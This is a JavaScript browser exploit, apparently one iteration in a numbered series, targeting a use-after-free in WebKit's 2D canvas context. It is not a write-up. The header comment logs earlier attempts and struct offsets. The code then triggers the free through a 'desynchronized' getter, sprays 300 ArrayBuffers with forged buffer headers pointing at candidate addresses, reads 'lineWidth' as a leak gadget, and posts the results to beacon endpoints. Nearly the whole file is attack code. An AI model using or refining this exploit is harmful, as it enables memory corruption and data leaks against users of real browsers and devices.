// p493 — spray-forged reclaim: 300 ArrayBuffers, each pre-forged at BOTH offset
// models (0x30 set and 0x70 set — disjoint fields), then the lineWidth read.
//
// Evidence chain:
//   R2 (20-context spray)      -> reclaim 4/4x5, lineWidth/.canvas reads SAFE.
//   p492 (single context)      -> died at lineWidth  => single alloc misses slot.
//   p490/p491 (single AB)      -> died at lineWidth  => same root cause.
//   p489 (200 AB spray)        -> survived, 0/200 scraps => zero-init, not absence.
//   Offset math (local WK-1400): 3 bases put m_canvas@+40 (matches audit);
//     FontCascade(64) then m_stateStack@0x70 (mja00 table; inline@0x80,
//     lineDash buf@0x128, unrealizedSave@0x250 all internally consistent).
// Both forged in every AB — whichever model is live, m_buffer=CAND, size=1.
//
// V493- beacons: BOOT, TRIG, SPRAY, FORGED, LEAK, DONE. No send() between
// trigger return and spray completion. Ladder via localStorage 'p493cand'.
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','TRIG','SPRAY','FORGED','LEAK','DONE','HTMLERR'].forEach(function(n){
    var x = new XMLHttpRequest();
    x.open('POST', BASE + '/beacon/V493-' + n);
    staged.push([n, x]);
  });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now()-T0) + 'ms] ' + (body||'')); return; }
    } catch(e) {}
  }

  var CANDS = [0x7EF5A8000, 0x7EF000000, 0x7F0000000, 0x10000000, 0x30000000,
               0x7E0000000, 0x50000000, 0x40000000];
  var idx = 0;
  try {
    idx = parseInt(localStorage.getItem('p493cand') || '0', 10);
    if (isNaN(idx) || idx < 0) idx = 0;
    if (idx >= CANDS.length) idx = CANDS.length - 1;
    localStorage.setItem('p493cand', String(idx + 1));
  } catch(e) {}
  var CAND = CANDS[idx];
  S('BOOT', 'cand=0x' + CAND.toString(16) + ' idx=' + idx + ' ' + navigator.userAgent);

  var tc = document.createElement('canvas');
  var inner = null;

  // proven trigger: 2d + desynchronized getter (VCAN 4/4x5 on this console)
  var outer = tc.getContext('2d', {
    get desynchronized() { inner = tc.getContext('2d'); return false; }
  });

  // ---- spray: 300 forged ABs, NOTHING between free and spray ----
  var N = 300, spray = new Array(N);
  for (var i = 0; i < N; i++) {
    var ab = new ArrayBuffer(768);
    var dv = new DataView(ab);
    dv.setUint32(0x30, CAND, true); dv.setUint32(0x34, 0, true);   // model B header
    dv.setUint32(0x38, 1, true); dv.setUint32(0x3C, 1, true);
    dv.setUint32(0x70, CAND, true); dv.setUint32(0x74, 0, true);   // model A header
    dv.setUint32(0x78, 1, true); dv.setUint32(0x7C, 1, true);
    spray[i] = ab;
  }
  S('SPRAY', 'n=' + N + ' forged-both-models');

  // ---- the read gadget ----
  var v = inner.lineWidth;
  var f = new ArrayBuffer(8), fv = new DataView(f);
  fv.setFloat64(0, v, true);
  var hi = fv.getUint32(0, true), lo = fv.getUint32(4, true);
  S('LEAK', 'lineWidth=' + v + ' bits=0x' + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0'));
  S('DONE', 'spray-forge-ok');
})();
